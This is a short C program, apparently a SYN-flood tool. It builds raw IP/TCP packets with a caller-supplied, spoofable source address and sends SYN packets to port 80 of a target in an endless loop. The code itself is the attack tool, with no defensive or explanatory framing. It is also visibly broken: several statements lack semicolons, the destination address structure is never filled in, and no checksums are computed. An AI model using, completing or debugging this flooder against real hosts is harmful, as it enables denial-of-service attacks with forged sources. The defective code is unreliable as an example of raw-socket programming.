#include <stdio.h>
#include <string.h>

#include <sys/socket.h>
#include <stdlib.h>

//Error handling for IP_HDRINCL
#include <errno.h>

//inet functions
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h> 

void source(int argc, char **argv)
{
	unsigned long ip = 0;

    if (0 == inet_pton(AF_INET, argv[1], &ip)) 
    {
		printf("Invalid IP\n");
   		exit(0);
    }

}

void destination(int argc, char **argv)
{
	unsigned long ip = 0;

    if (0 == inet_pton(AF_INET, argv[2], &ip)) 
    {
		printf("Invalid IP\n");
		exit(0);
    }

}

int main(int argc, char ** argv)
{
	source(argc, argv);
	destination(argc, argv);
	
//Create socket
	int sock = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

//Create dummy datagram
	char datagram[4096], source[32];
	
//IP header
	struct iphdr *iph = (struct iphdr *) datagram;

//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip)); 
	struct sockaddr_in sin;

	sin.sin_family = AF_INET;
	sin.sin_port  = htons(80)
	
	memset (datagram, 0, 4096); 
	
//Setting IP header parameters
	iph -> ihl = 5;				//Header length
	iph -> version = 4;			//Version
	iph -> tos = 0;				
	iph -> tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph -> id = htons(rand()) 	//Might be better hard coding a packet ID
	iph -> frag_off = 0;
	iph -> ttl = 255;			
	iph -> protocol = IPPROTO_TCP;
	iph -> saddr = inet_addr (argv[1]);
	iph -> daddr = inet_addr (argv[2]);
	
//Setting TCP header parameters

	tcph -> source = htons (1234)	//Source port. Could be randomised?
	tcph -> dest = htons (80)		//Destination port
	tcph -> seq = 0;
	tcph -> ack_seq = 0;
	tcph -> doff = 5;
	tcph -> fin = 0;
	tcph -> syn = 1;
	tcph -> rst = 0;
	tcph -> psh = 0;
	tcph -> ack = 0;
	tcph -> urg = 0;
	tcph -> window = htons(5840);	//Window size
	tcph -> urg_ptr = 0;
	
//Seems unnecessary but requires a pointer in setsockopt
	int one = 1;
	const int *val = &one;
	
	//Error handling telling the kernel that the packet includes headers
	if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, val, 1) < 0)
	{
		printf("Header error. Error num: %d. Message: %s\n", errno, strerror(errno));
		exit(0);
	}
	
//Sending the packet in an infinite loop
	while (1)
	{
		if (sendto (sock, datagram, iph -> tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
			{
			printf("error\n");
			}
			
		else
			{
			printf("Sent\n");
			}
	}
	
	return 0;
}